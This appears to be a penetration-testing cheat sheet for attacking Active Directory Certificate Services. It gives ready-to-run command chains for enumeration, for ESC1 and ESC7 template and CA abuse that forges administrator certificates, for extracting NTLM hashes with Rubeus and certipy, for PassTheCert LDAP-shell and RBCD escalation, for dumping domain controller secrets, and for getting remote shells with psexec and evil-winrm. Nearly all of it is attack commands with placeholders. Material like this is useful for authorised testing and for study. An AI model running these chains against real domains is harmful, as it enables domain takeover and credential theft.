---
title: "ADCS"
date: 2024-7-23
tags: ["Kerberos", "Pass-The-Ticket", "Certify", "Credential Dumping", "LDAP", "Pass-The-Hash", "Ticket Granting Ticket", "Domain Controller", "Certificate Services", "Active Driectory", "Windows", "ADCS", "Pass-The-Cert"]
---

### Enum (From Linux)

{{< tab set1 tab1 active >}}certipy-ad{{< /tab >}}
{{< tab set1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M adcs
```

{{< /tabcontent >}}

### Enum (From Windows)

{{< tab set2 tab1 active >}}powershell{{< /tab >}}
{{< tab set2 tab2 >}}certify{{< /tab >}}
{{< tab set2 tab3 >}}ADCSTemplate{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
# Check ADCS service
net start | findstr /i cert
```

```console
# Check env
certutil
```

```console
# List cert templates
certutil -catemplates
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
# Get info of each template
.\certify.exe find
```

```console
# Find vuln templates
.\certify.exe find /vulnerable /currentuser
```

{{< /tabcontent >}}
{{< tabcontent set2 tab3 >}}

```console
# Import ADCSTemplate module
import-module .\ADCSTemplate.psm1
```

```console
# List templates
get-adcstemplate | fl displayname
```

<small>*Ref: [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)*</small>

{{< /tabcontent >}}

---

### Request a certificate of current user

{{< tab set3 tab1 active >}}Linux{{< /tab >}}
{{< tab set3 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Request a certificate

```console
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca <CA> -template User -target <DC> -pfx <USER>.pfx
```

#### 2. Get NTLM hash

```console
sudo ntpdate -s <DC> && certipy-ad auth -pfx <USER>.pfx
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

#### 1. Request a certificate

```console
.\certify.exe request /ca:<CA> /template:User
```

#### 2. Convert pem to pfx

```console
# Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx
```

#### 3. Get NTLM hash

```console
.\rubeus.exe asktgt /user:'<USER>' /certificate:cert.pfx /getcredentials /show /nowrap
```

{{< /tabcontent >}}

---

### ESC1

```console
+----------------------------------------------------------+
| Enabled                        : True                    |
| Client Authentication          : True                    |
| Enrollee Supplies Subject      : True                    |
| Certificate Name Flag          : EnrolleeSuppliesSubject |
| Requires Management Approval   : False                   |
| Authorized Signatures Required : 0                       |
+----------------------------------------------------------+
```

#### Abuse #1: Add smartcard logon

{{< tab set4 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Import modules

```console
. .\PowerView.ps1
```

```console
. .\ADCS.ps1
```

#### 2. Add smartcart logon

```console
Get-SmartCardCertificate -Identity Administrator -TemplateName <VULN_TEMPLATE> -NoSmartCard -Verbose
```

#### 3. Get Cert_Thumbprint

```console
Get-ChildItem cert:\currentuser\my -recurse
```

#### 4. Get NTLM hash

```console
.\rubeus.exe asktgt /user:Administrator /certificate:<THUMBPRINT> /getcredentials /show /nowrap
```

#### 5. Remote

```console
impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
```

<small>*Ref: [PoshADCS](https://github.com/cfalta/PoshADCS)*</small>

{{< /tabcontent >}}

#### Abuse #2: Set alternative name

{{< tab set5 tab1 active >}}Linux{{< /tab >}}
{{< tab set5 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set5 tab1 >}}

#### 1. Generate a cert with altname

```console
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE>
```

#### 2. Get NTLM hash

```console
sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx
```

#### 3. Remote

```console
evil-winrm -i <TARGET> -u administrator -H <HASH>
```

{{< /tabcontent >}}
{{< tabcontent set5 tab2 >}}

#### 1. Generate a cert with altname

```console
.\certify.exe request /ca:<CA> /template:<VULN_TEMPLATE> /altname:administrator
```

#### 2. Convert pem to pfx

```console
# Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out administrator.pfx
```

#### 3. Get NTLM hash

```console
.\rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials /show /nowrap
```

#### 4. Remote

```console
# Remote
impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
```

{{< /tabcontent >}}

#### Abuse #3: Set msPKI-Certificate-Name-Flag

{{< tab set6 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set6 tab1 >}}

#### 1. Import ADCSTemplate module

```console
import-module .\ADCSTemplate.psm1
```

#### 2. Create template with msPKI-Certificate-Name-Flag modified

```console
Export-ADCSTemplate -displayName <VULN_TEMPLATE> > template.json
```

```console
$template = cat template.json -raw | ConvertFrom-Json
```

```console
$template.'msPKI-Certificate-Name-Flag' = 0x1
```

```console
$template | ConvertTo-Json | Set-Content template_mod.json
```

#### 3. Create a new certificate template

```console
New-ADCSTemplate -DisplayName 'vuln_esc1' -Publish -JSON (cat template_mod.json -raw)
```

#### 4. Allow the user to enroll in the certificate

```console
# Set permissions on the new template to allow a specific user to enroll in the certificate
Set-ADCSTemplateACL -DisplayName 'vuln_esc1' -type allow -identity '<DOMAIN>\<USER>' -enroll
```

#### 5. Request a cert with altname

```console
.\certify.exe request /ca:<CA> /template:vuln_esc1 /altname:administrator
```

#### 6. Get NTLM hash

```console
.\rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials /show /nowrap
```

#### 7. Remote

```console
impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
```

<small>*Ref: [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)*</small>

{{< /tabcontent >}}

---

### ESC7

```console
+---------------------+
| Access Right        |
|=====================|
| Manage CA           |
| Manage Certificates |
+---------------------+
```

<br>

{{< tab set7 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set7 tab1 >}}

#### 1. Use ManageCA privilege to add manage certificates permission

```console
certipy-ad ca -ca <CA> -add-officer '<USER>' -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

```console
# Check
certipy-ad find -dc-ip <DC> -ns <DC_IP> -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -vulnerable -stdout
```

#### 2. Request a cert based on SubCA

```console
# Take note of the Request ID
certipy-ad req -ca <CA> -target <TARGET_DOMAIN> -template SubCA -upn administrator@<DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

#### 3. Issue request using ManageCA and Manage Certificates privilege

```console
certipy-ad ca -ca <CA> -issue-request <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

#### 4. Request a certificate from CA on the target domain

```console
certipy-ad req -ca <CA> -target <TARGET_DOMAIN> -retrieve <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>'
```

#### 5. Get NTLM hash

```console
certipy-ad auth -pfx administrator.pfx -dc-ip <DC>
```

#### 6. Remote

```console
evil-winrm -i <TARGET> -u administrator -H <HASH>
```

{{< /tabcontent >}}

---

### Workaround: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP

#### 1. Create key and cert from pfx

```console
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
```

```console
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
```

{{< tab set8 tab1 active >}}LDAP Shell{{< /tab >}}
{{< tab set8 tab2 >}}RBCD{{< /tab >}}
{{< tabcontent set8 tab1 >}}

#### 1. Get a LDAP shell

```console
python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
```

#### 2. Add user to administrators group

```console
add_user_to_group '<USER>' administrators
```

#### 3. Remote

```console
evil-winrm -i <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>'
```

<small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>

{{< /tabcontent >}}
{{< tabcontent set8 tab2 >}}

#### 1. RBCD Attack

```console
python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'Evil_Computer$' -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
```

#### 2. Request a service ticket

```console
sudo ntpdate -s <DC> && python3 impacket-getST -spn 'cifs/<TARGET_DOMAIN>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<GENERATED_PASSWORD>'
```

#### 3. Secrets dump

```console
export KRB5CCNAME=Administrator.ccache
```

```console
impacket-secretsdump '<DOMAIN>/administrator@<TARGET_DOMAIN>' -k -no-pass -just-dc-ntlm
```

#### 5. Remote

```console
evil-winrm -i <TARGET_DOMAIN> -u administrator -H <HASH>
```

<small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>

{{< /tabcontent >}}